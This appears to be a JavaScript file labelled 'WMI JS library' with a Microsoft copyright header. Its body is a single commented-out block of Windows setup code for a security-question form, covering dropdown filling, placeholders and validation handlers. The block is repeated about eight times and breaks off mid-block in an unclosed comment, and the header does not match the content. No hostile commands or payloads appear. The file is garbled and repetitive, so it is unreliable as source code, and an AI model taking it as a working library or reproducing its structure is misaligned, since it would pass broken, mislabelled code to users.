// WMI JS library (2020-09-04)
// NOT 
//
// Copyright (C) Microsoft. All rights reserved.
//


   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
            var questionPlaceholderValue = ['SecurityQuestion1Placeholder', 'SecurityQuestion2Placeholder', 'SecurityQuestion3Placeholder'];
            var NUM_SECURITY_QUESTIONS = 6;
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currDropdown = securityQuestionDropdown[i];
                currDropdown.options[0] = new Option(localAccountResources[questionPlaceholderValue[i]], '', true, true);
                // Add label to question dropdown and corresponding answer input box
                answerInputBoxes[i].setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                currDropdown.setAttribute('aria-label', localAccountResources[questionPlaceholderValue[i]]);
                // Fill security question dropdown with questions
                for (var j = 1; j <= NUM_SECURITY_QUESTIONS; j++) {
                    var question = localAccountResources['SecurityQuestion' + j];
                    currDropdown.options[j] = new Option(question, question);
                    currDropdown.options[j].title = question;
                }
            }
            // Call _onFinish() on FinishButton click
            FinishButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onFinish.apply(this);
            }.bind(this));
            // Update textContent and accesskey for Finish and Cancel Button
            var checkAmersandFor = [FinishButton, CancelButton];
            checkAmersandFor.forEach(function (eachElement) {
                var result = CloudExperienceHost.ResourceManager.GetContentAndAccesskey(localAccountResources[eachElement.id]);
                eachElement.textContent = result.content;
                eachElement.accessKey = result.accessKey;
            });
            // Calling bridge to go cancel
            CancelButton.addEventListener("click", function (event) {
                event.preventDefault();
                _onCancel.apply(this);
            });
            // Add Event handlers and Validation checks for security question dropdowns
            var securityQuestionErrorDialog = [securityQuestion1_errorDialog, securityQuestion2_errorDialog, securityQuestion3_errorDialog];
            for (var i = 0; i < securityQuestionDropdown.length; i++) {
                var currSecurityQuestionDropdown = securityQuestionDropdown[i];
                // Disable security questions that have been chosen in another dropdown
                var otherDropdowns = securityQuestionDropdown.slice();
                otherDropdowns.splice(i, 1); 
                // Validate Security Question 'i' selection onBlur event
                currSecurityQuestionDropdown.addEventListener("blur", function (questionDropdown, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, questionDropdown, questionNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityQuestionDropdown, i));
                // Remove error-message(if any) on valid Security question 'i'
                currSecurityQuestionDropdown.addEventListener("change", function (securityErrorDialog, questionNumber) {
                    var errorCode = validator.validateSecurityQuestionSelection(null, this, questionNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityQuestionDropdown, securityQuestionErrorDialog[i], i));
            }
            //Add Validation checks for security answer inputs
            var securityAnswerInput = [securityAnswer1, securityAnswer2, securityAnswer3];
            var securityAnswerErrorDialog = [securityAnswer1_errorDialog, securityAnswer2_errorDialog, securityAnswer3_errorDialog];
            for (var i = 0; i < securityAnswerInput.length; i++) {
                var currSecurityAnswerInput = securityAnswerInput[i];
                // Validate Security Answer 'i' input field onBlur event
                currSecurityAnswerInput.addEventListener("blur", function (inputField, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, inputField, answerNumber);
                    _checkErrorCodeAndShowError(this, errorCode);
                }.bind(this, currSecurityAnswerInput, i));
                // Remove error-message(if any) on valid Security Answer 'i'
                currSecurityAnswerInput.addEventListener("keyup", function (securityErrorDialog, answerNumber) {
                    var errorCode = validator.validateSecurityAnswer(null, this, answerNumber);
                    _checkErrorCodeAndHideError(this, errorCode, securityErrorDialog);
                }.bind(currSecurityAnswerInput, securityAnswerErrorDialog[i], i));
            }
			 */
   /* ready: function (element, options) {
            // Dynamically adding textContent to following elements
            var setContentFor = [UpdateSQSATitle, SQSALegend, FinishButton, CancelButton];
            for (var i = 0; i < setContentFor.length; i++) {
                setContentFor[i].textContent = localAccountResources[setContentFor[i].id];
            }
            // Dynamically setting attributes for security answer input boxes
            var answerInputBoxes = [securityAnswer1, securityAnswer2, securityAnswer3];
            var answerPlaceholderValue = Array(3).fill('SecurityAnswerPlaceholder');
            for (var i = 0; i < answerInputBoxes.length; i++) {
                answerInputBoxes[i].setAttribute('placeholder', localAccountResources[answerPlaceholderValue[i]]);
            }
            // Dynamically adding security question selection placeholder
            var securityQuestionDropdown = [securityQuestion1, securityQuestion2, securityQuestion3];
